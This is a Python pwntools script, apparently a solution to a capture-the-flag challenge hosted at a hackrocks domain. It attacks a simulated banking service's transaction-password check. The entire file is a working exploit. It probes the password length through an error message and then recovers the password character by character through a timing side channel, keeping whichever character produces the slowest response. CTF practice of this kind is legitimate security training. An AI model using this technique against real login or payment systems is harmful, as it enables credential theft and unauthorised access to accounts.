from pwn import *
import string
import time

charset = string.ascii_letters + string.digits + string.punctuation

r = remote("deus.hackrocks.com", 10000)

def getPassLen():
    info("Getting password length...")

    for i in range(1, 20):
        print("\t Trying len "+str(i))
        r.sendline(b"2")
        r.recvuntil(b"Enter amount:")
        r.sendline(b"1")
        r.recvuntil(b"Enter destination account:")
        r.sendline(b"1")
        r.recvuntil(b"Enter your password to confirm the transaction:")
        r.sendline(b"A" * i)
        r.recvline()
        output = r.recvline()

        if b"Password lengths must match" not in output:
            info("Found. Password length: "+str(i))
            return i

def time_chars(pass_len):
    info("Timing charset...")

    for i in charset:
        r.sendline(b"2")
        r.recvuntil(b"Enter amount:")
        r.sendline(b"1")
        r.recvuntil(b"Enter destination account:")
        r.sendline(b"1")
        r.recvuntil(b"Enter your password to confirm the transaction:")

        start = time.time()

        payload = i + "A"*(pass_len-1)
        r.sendline(payload.encode())
        r.recvline()
        output = r.recvline()

        end = time.time()
        t = end - start

        print("\t Char "+i+" - Time: "+str(t))

def attack(pass_len):
    info("Retrieving password...")
    cont = pass_len
    password = ""

    for k in range (1, pass_len+1):

        cont -= 1
        maxT = 0
        maxChar = ""

        for c in charset:
            r.sendline(b"2")
            r.recvuntil(b"Enter amount:")
            r.sendline(b"1")
            r.recvuntil(b"Enter destination account:")
            r.sendline(b"1")
            r.recvuntil(b"Enter your password to confirm the transaction:")

            start = time.time()

            payload = password + c + "A"*cont
            r.sendline(payload.encode())
            r.recvline()
            output = r.recvline()

            end = time.time()
            t = end - start
            if t > maxT:
                maxT = t
                maxChar = c

                # OptimizaciÃ³n
                if t > (0.25*k):
                    break

        password += maxChar
        print("\t Password: "+password+"...")
    
    info("Found. Password: "+password)               



if __name__ == '__main__':
    
    pass_len = getPassLen()
    # time_chars(pass_len)
    password = attack(pass_len)

    